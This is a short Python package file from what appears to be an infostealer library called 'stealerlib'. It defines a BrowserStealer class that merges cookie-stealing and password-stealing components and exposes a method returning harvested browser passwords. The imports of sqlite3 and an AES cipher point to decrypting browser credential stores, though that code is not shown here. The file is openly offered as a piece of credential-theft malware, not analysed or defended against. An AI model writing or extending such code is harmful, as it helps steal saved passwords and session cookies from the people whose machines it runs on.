#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/browser/__init__.py
"""

import shutil
import sqlite3
import tempfile

from Cryptodome.Cipher import AES

from .cookies import CookieStealer
from .passwords import PasswordStealer


class BrowserStealer(PasswordStealer, CookieStealer):

    def __init__(self):
        CookieStealer.__init__(self)
        PasswordStealer.__init__(self)

    def passwords(self) -> list[tuple[str, ...]]:
        return self.get_passwords()
